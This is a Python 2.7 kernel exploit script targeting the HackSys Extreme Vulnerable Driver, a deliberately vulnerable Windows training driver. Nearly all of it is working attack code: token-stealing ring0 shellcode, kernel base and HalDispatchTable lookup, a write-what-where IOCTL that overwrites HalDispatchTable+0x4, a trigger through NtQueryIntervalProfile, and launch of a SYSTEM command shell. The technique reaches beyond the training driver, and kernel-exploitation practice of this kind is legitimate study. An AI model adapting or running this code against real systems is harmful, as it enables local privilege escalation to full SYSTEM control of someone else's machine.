# python2.7

import ctypes, sys, struct
from ctypes import *
from subprocess import *
  
class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]
  
def main():
    kernel32 = windll.kernel32
    psapi = windll.Psapi
    ntdll = windll.ntdll
  
    #Defining the ring0 shellcode and loading it in VirtualAlloc.
    shellcode = bytearray(
        "\x90\x90\x90\x90"              # NOP Sled
        "\x60"                          # pushad
        "\x31\xc0"                      # xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"  # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                  # mov eax,[eax+0x50]
        "\x89\xc1"                      # mov ecx,eax
        "\xba\x04\x00\x00\x00"          # mov edx,0x4
        "\x8b\x80\xb8\x00\x00\x00"      # mov eax,[eax+0xb8]
        "\x2d\xb8\x00\x00\x00"          # sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"      # cmp [eax+0xb4],edx
        "\x75\xed"                      # jnz 0x1a
        "\x8b\x90\xf8\x00\x00\x00"      # mov edx,[eax+0xf8]
        "\x89\x91\xf8\x00\x00\x00"      # mov [ecx+0xf8],edx
        "\x61"                          # popad
        "\x31\xc0"                      # xor eax,eax
        "\x83\xc4\x24"                  # add esp,byte +0x24
        "\x5d"                          # pop ebp
        "\xc2\x08\x00"                  # ret 0x8
    )
    ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
    shellcode_address = id(shellcode) + 20
    shellcode_final = struct.pack("<L",ptr)
    shellcode_final_address = id(shellcode_final) + 20
  
    print "[+] Address of ring0 shellcode: {0}".format(hex(shellcode_address))
    print "[+] Pointer for ring0 shellcode: {0}".format(hex(shellcode_final_address))
  
    #Enumerating load addresses for all device drivers, and fetching base address and name for ntkrnlpa.exe
    enum_base = (c_ulong * 1024)()
    enum = psapi.EnumDeviceDrivers(byref(enum_base), c_int(1024), byref(c_long()))
    if not enum:
        print "Failed to enumerate!!!"
        sys.exit(-1)
             
    for base_address in enum_base:
        if not base_address:
            continue
        base_name = c_char_p('\x00' * 1024)
        driver_base_name = psapi.GetDeviceDriverBaseNameA(base_address, base_name, 48)
        if not driver_base_name:
            print "Unable to get driver base name!!!"
            sys.exit(-1)
  
        if base_name.value.lower() == 'ntkrnl' or 'ntkrnl' in base_name.value.lower():
            base_name = base_name.value
            print "[+] Loaded Kernel: {0}".format(base_name)
            print "[+] Base Address of Loaded Kernel: {0}".format(hex(base_address))
            break
  
    #Getting the HalDispatchTable
    kernel_handle = kernel32.LoadLibraryExA(base_name, None, 0x00000001)
    if not kernel_handle:
        print "Unable to get Kernel Handle"
        sys.exit(-1)
  
    hal_address = kernel32.GetProcAddress(kernel_handle, 'HalDispatchTable')
  
    # Subtracting ntkrnlpa base in user space
    hal_address -= kernel_handle
  
    # To find the HalDispatchTable address in kernel space, add the base address of ntkrnpa in kernel space
    hal_address += base_address
     
    # Just add 0x4 to HAL address for HalDispatchTable+0x4
    hal4 = hal_address + 0x4
  
    print "[+] HalDispatchTable    : {0}".format(hex(hal_address))
    print "[+] HalDispatchTable+0x4: {0}".format(hex(hal4))
  
    #What-Where
    www = WriteWhatWhere()
    www.What = shellcode_final_address
    www.Where = hal4
    www_pointer = pointer(www)
  
    print "[+] What : {0}".format(hex(www.What))
    print "[+] Where: {0}".format(hex(www.Where))
  
    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
  
    if not hevDevice or hevDevice == -1:
        print "*** Couldn't get Device Driver handle"
        sys.exit(-1)
  
    kernel32.DeviceIoControl(hevDevice, 0x0022200B, www_pointer, 0x8, None, 0, byref(c_ulong()), None)
  
    #Calling the NtQueryIntervalProfile function, executing our shellcode
    ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))
    print "[+] nt authority\\system shell incoming"
    Popen("start cmd", shell=True)
  
if __name__ == "__main__":
    main()